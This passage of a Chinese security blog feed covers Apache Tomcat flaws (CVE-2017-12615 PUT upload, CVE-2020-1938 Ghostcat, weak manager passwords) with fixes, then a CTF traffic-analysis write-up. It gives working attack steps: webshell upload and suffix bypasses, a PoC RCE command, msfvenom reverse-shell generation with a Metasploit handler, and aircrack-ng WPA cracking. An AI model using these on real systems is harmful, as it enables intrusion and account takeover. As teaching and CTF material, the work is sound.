id="web-xml中servlet配置及其含义"><a href="#web-xml中servlet配置及其含义" class="headerlink" title="web.xml中servlet配置及其含义"></a>web.xml中servlet配置及其含义</h6><p>要从浏览器访问Java servlet，必须告诉servlet容器要部署哪些servlet以及要将servlet映射到哪个URL。 这是在Java Web应用程序的web.xml文件中完成的。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200930152001965.png" alt="image-20200930152001965"></p><p>首先浏览器通过<a href="http://localhost:8080/test01/MyServlet%E6%9D%A5%E6%89%BE%E5%88%B0web.xml%E4%B8%AD%E7%9A%84url-pattern%EF%BC%8C%E8%BF%99%E5%B0%B1%E6%98%AF%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%8C%E5%8C%B9%E9%85%8D%E5%88%B0%E4%BA%86url-pattern%E5%90%8E%EF%BC%8C%E5%B0%B1%E4%BC%9A%E6%89%BE%E5%88%B0%E7%AC%AC%E4%BA%8C%E6%AD%A5servlet%E7%9A%84%E5%90%8D%E5%AD%97MyServlet%EF%BC%8C%E7%9F%A5%E9%81%93%E4%BA%86%E5%90%8D%E5%AD%97%EF%BC%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87servlet-name%E6%89%BE%E5%88%B0%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%8C%E5%88%B0%E4%BA%86%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%8C%E4%B9%9F%E5%B0%B1%E8%83%BD%E5%A4%9F%E7%9F%A5%E9%81%93servlet%E7%9A%84%E4%BD%8D%E7%BD%AE%E4%BA%86%E3%80%82%E7%84%B6%E5%90%8E%E5%88%B0%E5%85%B6%E4%B8%AD%E6%89%BE%E5%88%B0%E5%AF%B9%E5%BA%94%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F%E8%BF%9B%E8%A1%8C%E5%A4%84%E7%90%86%E3%80%82">http://localhost:8080/test01/MyServlet来找到web.xml中的url-pattern，这就是第一步，匹配到了url-pattern后，就会找到第二步servlet的名字MyServlet，知道了名字，就可以通过servlet-name找到第三步，到了第三步，也就能够知道servlet的位置了。然后到其中找到对应的处理方式进行处理。</a></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="CVE-2017-12615"><a href="#CVE-2017-12615" class="headerlink" title="CVE-2017-12615"></a>CVE-2017-12615</h4><p>影响版本：Apache Tomcat 7.0.0-Apache Tomcat 7.0.81</p><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>Tomcat PUT方法任意写文件漏洞</p><p>该漏洞可以利用HTTP的PUT方法直接上传webshell到目标服务器，从而获取权限。</p><p>在Tomcat的web.xml默认情况下不存在该漏洞，但是一单开发者或者运维人员手动讲web.xml中的readonly设置为false，可以通过 PUT / DELETE 进行文件操控。</p><p>漏洞的核心错误配置是web.xml中的readonly</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">init</span>-param&gt; </span><br><span class="line">&lt;param-name&gt;<span class="keyword">readonly</span>&lt;/param-name&gt; </span><br><span class="line">&lt;param-<span class="keyword">value</span>&gt;<span class="literal">true</span>&lt;/param-<span class="keyword">value</span>&gt; </span><br><span class="line">&lt;/<span class="keyword">init</span>-param&gt;</span><br></pre></td></tr></table></figure><h5 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200611151016949.png" alt="image-20200611151016949"></p><p>访问shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.102:8080&#x2F;Shell.jsp?cmd&#x3D;id</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200611151044485.png" alt="image-20200611151044485"></p><h5 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h5><p>win：</p><p>1、利用/shell.jsp::$DATA的方式绕过<br>2、/shell.jsp%20，空格绕过<br>3、/shell.jsp/ ， Tomcat在处理文件时会删除最后的/<br>Linux：<br>1、/shell.jsp/ ， Tomcat在处理文件时会删除最后的/</p><p>漏洞分析</p><ul><li>web.xml配置</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.apache.jasper.servlet.JspServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;<span class="keyword">init</span>-param&gt;</span><br><span class="line">        &lt;param-name&gt;fork&lt;/param-name&gt;</span><br><span class="line">        &lt;param-<span class="keyword">value</span>&gt;<span class="literal">false</span>&lt;/param-<span class="keyword">value</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">init</span>-param&gt;</span><br><span class="line">    &lt;<span class="keyword">init</span>-param&gt;</span><br><span class="line">        &lt;param-name&gt;xpoweredBy&lt;/param-name&gt;</span><br><span class="line">        &lt;param-<span class="keyword">value</span>&gt;<span class="literal">false</span>&lt;/param-<span class="keyword">value</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">init</span>-param&gt;</span><br><span class="line">    &lt;load-<span class="keyword">on</span>-startup&gt;<span class="number">3</span>&lt;/load-<span class="keyword">on</span>-startup&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;<span class="keyword">default</span>&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;<span class="keyword">init</span>-param&gt;</span><br><span class="line">        &lt;param-name&gt;debug&lt;/param-name&gt;</span><br><span class="line">        &lt;param-<span class="keyword">value</span>&gt;<span class="number">0</span>&lt;/param-<span class="keyword">value</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">init</span>-param&gt;</span><br><span class="line">    &lt;<span class="keyword">init</span>-param&gt;</span><br><span class="line">        &lt;param-name&gt;listings&lt;/param-name&gt;</span><br><span class="line">        &lt;param-<span class="keyword">value</span>&gt;<span class="literal">false</span>&lt;/param-<span class="keyword">value</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">init</span>-param&gt;</span><br><span class="line">    &lt;load-<span class="keyword">on</span>-startup&gt;<span class="number">1</span>&lt;/load-<span class="keyword">on</span>-startup&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;<span class="keyword">default</span>&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- The mappings <span class="keyword">for</span> the JSP servlet --&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;</span><br><span class="line">    &lt;url-pattern&gt;*.jspx&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure><p>我们可以看到如果url中有jsp、jspx会使用名字为jsp的servlet，进而调用<code>org.apache.jasper.servlet.JspServlet</code>类</p><p>反之调用默认servlet，进而调用<code>org.apache.catalina.servlets.DefaultServlet</code>。</p><ul><li><p>readonly</p><p>作用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--   readonly            Is this context &quot;read only&quot;, so HTTP           --&gt;</span><br><span class="line">&lt;!--                       commands like PUT and DELETE are               --&gt;</span><br><span class="line">&lt;!--                       rejected?  [true]                              --&gt;</span><br></pre></td></tr></table></figure></li><li><p>关键</p><p>配置文件中主要定义了default servlet 和 JSP servlet两个servlet，DefaultServlet的作用是处理静态文件 ，JspServlet 的作用是处理jsp 与jspx 文件的请求，同时DefaultServlet 可以处理 PUT 或 DELETE请求。</p><p> 可以看出即使设置readonly为false，默认tomcat也不允许PUT上传jsp和jspx文件的，因为后端都用org.apache.jasper.servlet.JspServlet来处理jsp或是jspx后缀的请求了，而JspServlet中没有PUT上传的逻辑，PUT的代码实现只存在于DefaultServlet中。</p></li></ul><p>漏洞的根本是通过构造特殊后缀名，绕过了tomcat检测，让它用DefaultServlet的逻辑去处理请求，从而上传jsp文件。上传jsp文件但是让他DefaultServlet来处理他。、</p><h5 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h5><ul><li>使用tomcat8及以上版本</li><li>在web.xml文件中将readonly参数删掉，或者将readonly参数设置为true</li></ul><h4 id="CVE-2020-1938"><a href="#CVE-2020-1938" class="headerlink" title="CVE-2020-1938"></a>CVE-2020-1938</h4><p>影响版本</p><p>Apache Tomcat 9.x &lt; 9.0.31<br>Apache Tomcat 8.x &lt; 8.5.51<br>Apache Tomcat 7.x &lt; 7.0.100<br>Apache Tomcat 6.x</p><p>Tomcat AJP协议由于存在实现缺陷导致相关参数可控，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若服务器端同时存在文件上传功能，攻击者可进一步实现远程代码的执行。</p><p>当ajp URI设置为非jsp路径时，Tomcat会调用DefaultServlet处理，此时会导致web目录任意文件读取漏洞。当ajp URI设置为jsp路径时，Tomcat会调用JspServlet处理，此时会导致JSP文件包含漏洞。</p><h5 id="Web目录任意文件读取漏洞"><a href="#Web目录任意文件读取漏洞" class="headerlink" title="Web目录任意文件读取漏洞"></a>Web目录任意文件读取漏洞</h5><p>长亭扫描器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  xray .&#x2F;xray webscan --url http:&#x2F;&#x2F;127.0.0.1:8080&#x2F; --html-output single-url.html</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200612145955946.png" alt="image-20200612145955946"></p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200612150021877.png" alt="image-20200612150021877"></p><h5 id="任意命令执行"><a href="#任意命令执行" class="headerlink" title="任意命令执行"></a>任意命令执行</h5><p>该漏洞可以任意文件类型解析为jsp，从而达到任意命令执行的效果。但漏洞需要配合文件上传漏洞才可利用，假设目标服务器已经有了一个shell.png，里面内容是执行任意命令，可以执行以下命令得到命令执行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">margine:CVE-2020-1938 margin$ python 2020-10487.py -f &#x2F;shell.png 127.0.0.1 --rce 1</span><br><span class="line">Getting resource at ajp13:&#x2F;&#x2F;127.0.0.1:8009&#x2F;hissec.jsp</span><br><span class="line">----------------------------</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;IP LPORT&#x3D;4444 &gt; shell.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload java&#x2F;jsp_shell_</span><br><span class="line">set payload java&#x2F;jsp_shell_bind_tcp     set payload java&#x2F;jsp_shell_reverse_tcp  </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload java&#x2F;jsp_shell_reverse_tcp </span><br><span class="line">payload &#x3D;&gt; java&#x2F;jsp_shell_reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost 192.168.0.67</span><br><span class="line">lhost &#x3D;&gt; 192.168.0.67</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 4444</span><br><span class="line">lport &#x3D;&gt; 4444</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.67:4444</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python 2020-10487.py -f &#x2F;shell.txt 127.0.0.1 --rce 1</span><br><span class="line">弱口令</span><br></pre></td></tr></table></figure><p>修复方法</p><p>禁用AJP协议</p><blockquote><p>&lt;Connector port=”8009”protocol=”AJP/1.3” redirectPort=”8443” /&gt;</p></blockquote><p>将此行注释掉（也可删掉该行）：</p><blockquote><!--<Connectorport="8009" protocol="AJP/1.3"redirectPort="8443" />--></blockquote><p>配置secret来设置AJP协议的认证凭证。</p><p>例如（注意必须将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值）：</p><blockquote><p>&lt;Connector port=”8009”protocol=”AJP/1.3” redirectPort=”8443”address=”YOUR_TOMCAT_IP_ADDRESS” secret=”YOUR_TOMCAT_AJP_SECRET”/&gt;</p></blockquote><h4 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h4><h5 id="版本范围："><a href="#版本范围：" class="headerlink" title="版本范围："></a>版本范围：</h5><p>Tomcat版本：8.0</p><h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。</p><p>在<code>conf/tomcat-users.xml</code>文件中配置用户的权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;user username&#x3D;&quot;tomcat&quot; password&#x3D;&quot;tomcat&quot; roles&#x3D;&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><ul><li>manager-gui 拥有html页面权限</li><li>manager-status 拥有查看status的权限</li><li>manager-script 拥有text接口的权限，和status权限</li><li>manager-jmx 拥有jmx权限，和status权限</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;tomcat-users xmlns=<span class="string">&quot;http://tomcat.apache.org/xml&quot;</span></span><br><span class="line">              xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">              xsi:schemaLocation=<span class="string">&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span></span><br><span class="line">              version=<span class="string">&quot;1.0&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;role rolename=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span><br><span class="line">    &lt;role rolename=<span class="string">&quot;manager-script&quot;</span>/&gt;</span><br><span class="line">    &lt;role rolename=<span class="string">&quot;manager-jmx&quot;</span>/&gt;</span><br><span class="line">    &lt;role rolename=<span class="string">&quot;manager-status&quot;</span>/&gt;</span><br><span class="line">    &lt;role rolename=<span class="string">&quot;admin-gui&quot;</span>/&gt;</span><br><span class="line">    &lt;role rolename=<span class="string">&quot;admin-script&quot;</span>/&gt;</span><br><span class="line">    &lt;user username=<span class="string">&quot;tomcat&quot;</span> password=<span class="string">&quot;tomcat&quot;</span> roles=<span class="string">&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot;</span> /&gt;</span><br><span class="line">    </span><br><span class="line">&lt;/tomcat-users&gt;</span><br></pre></td></tr></table></figure><p>可见，用户tomcat拥有上述所有权限，密码是<code>tomcat</code>。</p><p>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。</p><p>打开tomcat管理页面<code>http://your-ip:8080/manager/html</code>，输入弱密码<code>tomcat:tomcat</code>，即可访问后台：</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/1.png" alt="img"></p><p>上传war包即可直接getshell。</p><h5 id="war制作"><a href="#war制作" class="headerlink" title="war制作"></a>war制作</h5><ul><li>压缩jsp马然后改为war后缀</li></ul><ul><li><p>war包名字和shell名字一样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cvf shell.war shell.jsp</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;中间件漏洞总结&quot;&gt;&lt;a href=&quot;#中间件漏洞总结&quot; class=&quot;headerlink&quot; title=&quot;中间件漏洞总结&quot;&gt;&lt;/a&gt;中间件漏洞总结&lt;/h1&gt;&lt;h2 id=&quot;IIS&quot;&gt;&lt;a href=&quot;#IIS&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    <category term="组件安全" scheme="http://s1eady.top/categories/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="组件安全" scheme="http://s1eady.top/tags/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CTF-流量分析题2</title>
    <link href="http://s1eady.top/2019/04/09/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%982/"/>
    <id>http://s1eady.top/2019/04/09/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%982/</id>
    <published>2019-04-08T22:34:56.000Z</published>
    <updated>2020-10-25T08:11:48.680Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF-流量分析题2"><a href="#CTF-流量分析题2" class="headerlink" title="CTF-流量分析题2"></a>CTF-流量分析题2</h1><h2 id="dhcp-pcap"><a href="#dhcp-pcap" class="headerlink" title="dhcp.pcap"></a>dhcp.pcap</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What IP address is requested by the client?</span><br></pre></td></tr></table></figure><p>Wireshark没有专门用于<em>DHCP</em>流量的内置显示筛选器，但确实具有用于基础协议BOOTP的显示筛选器。</p><p>阅读<code>[Wireshark Wiki的DHCP页面</code>和<code>BOOTP显示过滤器</code>参考我们发现我们可以对BOOTP选项类型进行过滤以仅过滤DHCP请求。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bootp.option.dhcp &#x3D;&#x3D; 3</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/1D3E5A0B-212D-40F7-B2F2-56480E1628D5.png" alt="1D3E5A0B-212D-40F7-B2F2-56480E1628D5"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&lt;192.168.2.244&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is the transaction ID for the DHCP release?</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bootp.option.dhcp &#x3D;&#x3D; 7</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/F1D92743-FC92-4D21-8AAA-1B136399CC18.png" alt="F1D92743-FC92-4D21-8AAA-1B136399CC18"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is the MAC address of the client?</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bootp.option.dhcp &#x3D;&#x3D; 3</span><br></pre></td></tr></table></figure><p>问题1的DHCP请求，我们可以简单地检查数据包详细信息并读取“客户端MAC地址”字段。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/1F1D8AE5-910B-4F84-AC92-6BD1B5EFC406.png" alt="1F1D8AE5-910B-4F84-AC92-6BD1B5EFC406"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&lt;00:0C:29:82:F5:94&gt;</span><br></pre></td></tr></table></figure><h2 id="dns-pcap"><a href="#dns-pcap" class="headerlink" title="dns.pcap"></a>dns.pcap</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is the response for the lookup for flag.fruitinc.xyz?</span><br></pre></td></tr></table></figure><p>检查“数据包详细信息”的“答案”部分，我们发现包含该标志的TXT记录。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/33674F93-C34E-4F9E-8C7F-9DC261E0F69A.png" alt="33674F93-C34E-4F9E-8C7F-9DC261E0F69A"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Which root server responds to the query?</span><br></pre></td></tr></table></figure><p>PCAP中的第一个DNS响应包含DNS根服务器列表。</p><h2 id="backdoor-pcap"><a href="#backdoor-pcap" class="headerlink" title="backdoor++.pcap"></a>backdoor++.pcap</h2><p>分析协议发现有icmp协议，直接搜索flag，每次搜索一个字符，发现在icmp数据包的data字段的第一个十六进制对应flag的每一个字符。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201019211030724.png" alt="image-20201019211030724"></p><p>数据提取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ tshark -r &#x2F;tmp&#x2F;backdoor++.pcap -T fields -Y &quot;icmp&quot; -e &quot;data&quot; &gt; 1.txt</span><br></pre></td></tr></table></figure><p>拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f&#x3D;open(&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.txt&quot;,&quot;r&quot;)</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in f.readlines():</span><br><span class="line">    if len(i)&#x3D;&#x3D;27:</span><br><span class="line">        flag+&#x3D;chr(int(i[:2],16))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="cacosmia-cap"><a href="#cacosmia-cap" class="headerlink" title="cacosmia.cap"></a>cacosmia.cap</h2><p>无线wifi流量包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ aircrack-ng &#x2F;tmp&#x2F;cacosmia.cap</span><br><span class="line">Opening &#x2F;tmp&#x2F;cacosmia.capait...</span><br><span class="line">Read 4276 packets.</span><br><span class="line"></span><br><span class="line">   #  BSSID              ESSID                     Encryption</span><br><span class="line"></span><br><span class="line">   1  1A:D7:17:98:D0:51  mamawoxiangwantiequan     WPA (1 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as target.</span><br><span class="line"></span><br><span class="line">Opening &#x2F;tmp&#x2F;cacosmia.capait...</span><br><span class="line">Read 4276 packets.</span><br><span class="line"></span><br><span class="line">1 potential targets</span><br><span class="line"></span><br><span class="line">Please specify a dictionary (option -w).</span><br><span class="line">破解密码</span><br><span class="line">steady@steady:~$ aircrack-ng &#x2F;tmp&#x2F;cacosmia.cap -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;fern-wifi&#x2F;common.txt</span><br><span class="line">steady@steady:~$ airdecap-ng &#x2F;tmp&#x2F;cacosmia.cap -e mamawoxiangwantiequan -p 12345678</span><br><span class="line">Total number of stations seen            6</span><br><span class="line">Total number of packets read          4276</span><br><span class="line">Total number of WEP data packets         0</span><br><span class="line">Total number of WPA data packets       685</span><br><span class="line">Number of plaintext data packets         0</span><br><span class="line">Number of decrypted WEP  packets         0</span><br><span class="line">Number of corrupted WEP  packets         0</span><br><span class="line">Number of decrypted WPA  packets       538</span><br><span class="line">Number of bad TKIP (WPA) packets         0</span><br><span class="line">Number of bad CCMP (WPA) packets         0</span><br></pre></td></tr></table></figure><p>破解出一个pcap流量包。发现一个post请求有一个图片，图片里面有个压缩包，压缩包里面就是flag，然后发现cookie中JWT有hint，hint提示压缩包密码是ping的网址。所以直接搜索dns协议，找到最后一个地址就是密码。</p><h2 id="铁人三项2018"><a href="#铁人三项2018" class="headerlink" title="铁人三项2018"></a>铁人三项2018</h2><p>第一次攻击是sql注入攻击，攻击IP为202.1.1.2，受害者为192.168.1.8。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201025160906613.png" alt="image-20201025160906613"></p><p>分析其中一个数据包可以得知注入参数为list[select]，使用的工具为sqlmap、版本为1.1.3.2。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201025160801088.png" alt="image-20201025160801088"></p><p>使用wireshark过滤这两个IP的通信。</p><p><code>http and ip.addr == 202.1.1.2 and ip.addr == 192.168.1.8</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF-流量分析题2&quot;&gt;&lt;a href=&quot;#CTF-流量分析题2&quot; class=&quot;headerlink&quot; title=&quot;CTF-流量分析题2&quot;&gt;&lt;/a&gt;CTF-流量分析题2&lt;/h1&gt;&lt;h2 id=&quot;dhcp-pcap&quot;&gt;&lt;a href=&quot;#dhcp-pcap&quot; c</summary>
      
    
    
    
    <category term="CTF-流量分析" scheme="http://s1eady.top/categories/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CTF-流量分析" scheme="http://s1eady.top/tags/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
